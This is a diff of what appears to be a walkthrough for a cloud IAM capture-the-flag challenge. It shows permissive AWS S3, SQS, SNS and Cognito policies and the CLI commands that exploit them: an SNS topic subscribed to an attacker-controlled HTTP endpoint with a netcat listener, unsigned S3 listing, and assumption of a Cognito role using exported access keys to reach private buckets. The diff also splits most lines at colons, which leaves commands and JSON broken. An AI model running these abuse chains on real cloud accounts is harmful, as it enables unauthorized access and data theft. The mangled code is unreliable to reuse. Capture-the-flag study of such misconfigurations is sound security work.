@@ -11,27 +11,29 @@
  {
  "Effect": "Allow",
  "Principal": "*",
- "Action": "s3:GetObject",
- "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
+ "Action": "s3:
+GetObject",
+ "Resource": "arn:
+aws:s3:::
+thebigiamchallenge-storage-9979f4b/*"
  },
  {
  "Effect": "Allow",
  "Principal": "*",
- "Action": "s3:ListBucket",
- "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
+ "Action": "s3:
+ListBucket",
+ "Resource": "arn:
+aws:s3:::
+thebigiamchallenge-storage-9979f4b",
  "Condition": {
  "StringLike": {
- "s3:prefix": "files/*"
+ "s3:
+prefix": "files/*"
  }
  }
  }
  ]
 }
-```
-
-
-
-```
 {
  "Version": "2012-10-17",
  "Statement": [
@@ -39,24 +41,20 @@
  "Effect": "Allow",
  "Principal": "*",
  "Action": [
- "sqs:SendMessage",
- "sqs:ReceiveMessage"
+ "sqs:
+SendMessage",
+ "sqs:
+ReceiveMessage"
  ],
- "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
+ "Resource": "arn:
+aws:
+sqs:us-east-1:
+092297851374:
+wiz-tbic-analytics-sqs-queue-ca7a1b2"
  }
  ]
 }
-```
-
-
-
-```
 aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
-```
-
-
-
-```
 {
  "Version": "2008-10-17",
  "Id": "Statement1",
@@ -67,88 +65,81 @@ aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz
  "Principal": {
  "AWS": "*"
  },
- "Action": "SNS:Subscribe",
- "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
+ "Action": "SNS:
+Subscribe",
+ "Resource": "arn:
+aws:
+sns:us-east-1:
+092297851374:
+TBICWizPushNotifications",
  "Condition": {
  "StringLike": {
- "sns:Endpoint": "*@tbic.wiz.io"
+ "sns:
+Endpoint": "*@tbic.wiz.io"
  }
  }
  }
  ]
 }
-```
-
-
-
-```
 > aws sns subscribe help
 
 subscribe
 --topic-arn <value>
 --protocol <value>
 [--notification-endpoint <value>]
-```
-
-
-
-```
 nc -lvk 80
-```
-
-
-
-```
-aws sns subscribe --protocol http --notification-endpoint http://123.123.123.123:800/@tbic.wiz.io --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications
-```
-
-
-
-```
-aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --token 336412f37fb687f5d51e6e2425c464de257ebd13d0594......
-```
-
-
-
-```
+aws sns subscribe --protocol http --notification-endpoint http://123.123.123.123:
+800/@tbic.wiz.io --topic-arn arn:
+aws:
+sns:us-east-1:
+092297851374:
+TBICWizPushNotifications
+aws sns confirm-subscription --topic-arn arn:
+aws:
+sns:us-east-1:
+092297851374:
+TBICWizPushNotifications --token 336412f37fb687f5d51e6e2425c464de257ebd13d0594......
 {
  "Version": "2012-10-17",
  "Statement": [
  {
  "Effect": "Allow",
  "Principal": "*",
- "Action": "s3:GetObject",
- "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
+ "Action": "s3:
+GetObject",
+ "Resource": "arn:
+aws:s3:::
+thebigiamchallenge-admin-storage-abf1321/*"
  },
  {
  "Effect": "Allow",
  "Principal": "*",
- "Action": "s3:ListBucket",
- "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
+ "Action": "s3:
+ListBucket",
+ "Resource": "arn:
+aws:s3:::
+thebigiamchallenge-admin-storage-abf1321",
  "Condition": {
  "StringLike": {
- "s3:prefix": "files/*"
+ "s3:
+prefix": "files/*"
  },
- "ForAllValues:StringLike": {
- "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
+ "ForAllValues:
+StringLike": {
+ "aws:
+PrincipalArn": "arn:
+aws:
+iam::
+133713371337:
+user/admin"
  }
  }
  }
  ]
 }
-```
-
-
-
-```
 > aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/'
 
 An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied
-```
-
-
-
-```
 > aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/' --no-sign-request
 
 {
@@ -169,11 +160,6 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
  }
  ]
 }
-```
-
-
-
-```
 {
  "Version": "2012-10-17",
  "Statement": [
@@ -181,7 +167,8 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
  "Sid": "VisualEditor0",
  "Effect": "Allow",
  "Action": [
- "mobileanalytics:PutEvents",
+ "mobileanalytics:
+PutEvents",
  "cognito-sync:*"
  ],
  "Resource": "*"
@@ -190,33 +177,35 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
  "Sid": "VisualEditor1",
  "Effect": "Allow",
  "Action": [
- "s3:GetObject",
- "s3:ListBucket"
+ "s3:
+GetObject",
+ "s3:
+ListBucket"
  ],
  "Resource": [
- "arn:aws:s3:::wiz-privatefiles",
- "arn:aws:s3:::wiz-privatefiles/*"
+ "arn:
+aws:s3:::
+wiz-privatefiles",
+ "arn:
+aws:s3:::
+wiz-privatefiles/*"
  ]
  }
  ]
 }
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
  <title>Cognito JavaScript SDK Example</title>
  <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
 </head>
-<body>
+
  <script>
  // 初始化AWS SDK配置
  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({
- IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
+ IdentityPoolId: 'us-east-1:
+b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
  });
  // 获取临时凭证
  AWS.config.credentials.get(function(err) {
@@ -254,25 +243,21 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
  });
  }
  </script>
-</body>
+
 </html>
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
  <title>Cognito JavaScript SDK Example</title>
  <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
 </head>
-<body>
+
  <script>
  // 初始化AWS SDK配置
  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({
- IdentityPoolId: 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
+ IdentityPoolId: 'us-east-1:
+b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
  });
  // 获取临时凭证
  AWS.config.credentials.get(function(err) {
@@ -311,13 +296,8 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
  });
  }
  </script>
-</body>
+
 </html>
-```
-
-
-
-```
 {
  "Version": "2012-10-17",
  "Statement": [
@@ -326,52 +306,43 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
  "Principal": {
  "Federated": "cognito-identity.amazonaws.com"
  },
- "Action": "sts:AssumeRoleWithWebIdentity",
+ "Action": "sts:
+AssumeRoleWithWebIdentity",
  "Condition": {
  "StringEquals": {
- "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
+ "cognito-identity.amazonaws.com:
+aud": "us-east-1:
+b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
  }
  }
  }
  ]
 }
-```
-
-
-
-```
 > aws sts assume-role-with-web-identity help
 
 --role-arn <value>
 --role-session-name <value>
 --web-identity-token <value>
-```
-
-
-
-```
-> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
+> aws cognito-identity get-id --identity-pool-id us-east-1:
+b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
 
 {
- "IdentityId": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db"
+ "IdentityId": "us-east-1:
+453cea83-a2c0-4b64-a7ff-9dc3783701db"
 }
-```
-
-
-
-```
-> aws cognito-identity get-open-id-token --identity-id us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db
+> aws cognito-identity get-open-id-token --identity-id us-east-1:
+453cea83-a2c0-4b64-a7ff-9dc3783701db
 
 {
- "IdentityId": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db",
+ "IdentityId": "us-east-1:
+453cea83-a2c0-4b64-a7ff-9dc3783701db",
  "Token": "eyJraWQiOiJ1cy1lYXN0Lxxxx..."
 }
-```
-
-
-
-```
-> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name teamssix --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoi...
+> aws sts assume-role-with-web-identity --role-arn arn:
+aws:
+iam::
+092297851374:
+role/Cognito_s3accessAuth_Role --role-session-name teamssix --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoi...
 
 {
  "Credentials": {
@@ -380,27 +351,24 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
  "SessionToken": "IQoJb3JpZ2luX2VjEND...",
  "Expiration": "2023-07-06T16:36:18+00:00"
  },
- "SubjectFromWebIdentityToken": "us-east-1:453cea83-a2c0-4b64-a7ff-9dc3783701db",
+ "SubjectFromWebIdentityToken": "us-east-1:
+453cea83-a2c0-4b64-a7ff-9dc3783701db",
  "AssumedRoleUser": {
- "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:teamssix",
- "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/teamssix"
+ "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:
+teamssix",
+ "Arn": "arn:
+aws:
+sts::
+092297851374:
+assumed-role/Cognito_s3accessAuth_Role/teamssix"
  },
  "Provider": "cognito-identity.amazonaws.com",
- "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
+ "Audience": "us-east-1:
+b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
 }
-```
-
-
-
-```
 > export AWS_ACCESS_KEY_ID=ASIARK7LBOHXDFQ6KRE3
 > export AWS_SECRET_ACCESS_KEY=Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj
 > export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEND...
-```
-
-
-
-```
 > aws s3 ls
 
 2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
@@ -408,10 +376,5 @@ An error occurred (AccessDenied) when calling the ListObjects operation: Access 
 2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
 2023-06-05 21:28:31 wiz-privatefiles
 2023-06-05 21:28:31 wiz-privatefiles-x1000
-```
-
-
-
-```
 aws s3api get-object --bucket wiz-privatefiles-x1000 --key flag2.txt flag2.txt
 ```
